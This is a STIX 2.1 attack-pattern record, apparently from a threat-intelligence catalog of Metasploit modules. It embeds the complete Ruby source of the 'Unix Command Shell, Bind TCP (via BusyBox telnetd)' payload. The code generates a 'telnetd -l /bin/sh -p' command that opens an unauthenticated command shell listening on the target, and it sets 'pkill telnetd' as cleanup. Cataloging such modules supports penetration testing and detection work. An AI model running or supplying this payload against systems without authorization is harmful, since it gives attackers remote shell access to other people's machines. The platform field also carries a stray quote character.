{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1beb9353-e9c4-41ff-9ed9-ac48ff263aac",
    "created": "2024-08-14T16:33:19.318953Z",
    "modified": "2024-08-14T16:33:19.318957Z",
    "name": "Unix Command Shell, Bind TCP (via BusyBox telnetd)",
    "description": "Listen for a connection and spawn a command shell via BusyBox telnetd",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/bind_busybox_telnetd.rb",
            "external_id": "bind_busybox_telnetd.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 26\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Bind TCP (via BusyBox telnetd)',\n     'Description'   => 'Listen for a connection and spawn a command shell via BusyBox telnetd',\n     'Author'        => 'Matthew Kienow <matthew_kienow[AT]rapid7.com>',\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::BindTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'telnetd',\n     'Payload'       => {\n       'Offsets' => { },\n       'Payload' => ''\n     }\n   ))\n\n    register_options(\n      [\n        OptString.new('LOGIN_CMD', [true, 'Command telnetd will execute on connect', '/bin/sh']),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('CommandShellCleanupCommand', [true, 'A command to run before the session is closed', 'pkill telnetd']),\n        OptString.new('TelnetdPath', [true, 'The path to the telnetd executable', 'telnetd'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    \"#{datastore['TelnetdPath']} -l #{datastore['LOGIN_CMD']} -p #{datastore['LPORT']}\"\n  end\n\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}